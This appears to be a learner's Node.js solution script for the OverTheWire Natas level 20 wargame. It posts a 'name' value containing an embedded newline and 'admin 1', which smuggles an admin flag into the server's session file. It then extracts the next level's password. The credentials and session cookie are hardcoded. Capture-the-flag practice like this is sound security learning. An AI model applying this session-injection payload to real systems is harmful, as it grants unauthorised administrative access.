let username = 'natas20';
let password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF';

const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

let options = {
    uri: `http://${username}.natas.labs.overthewire.org?debug=true`,
    method: 'POST',
    formData: {
        name: 'admin\nadmin 1',
    },
    headers: {
        'Cookie' : 'PHPSESSID=90t6a890b3ejsohr2omlha5g33'
    }
}
rp(options)
    .auth(username, password)
    .then($ => {
        /*console.log($('#content').html()
            .split('<br>')
            .filter(row => row.includes('DEBUG'))
            .join('\n')
        );*/
        rp(options)
            .auth(username, password)
            .then($ => {
                console.log($.text().trim().match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0])
            });
    });
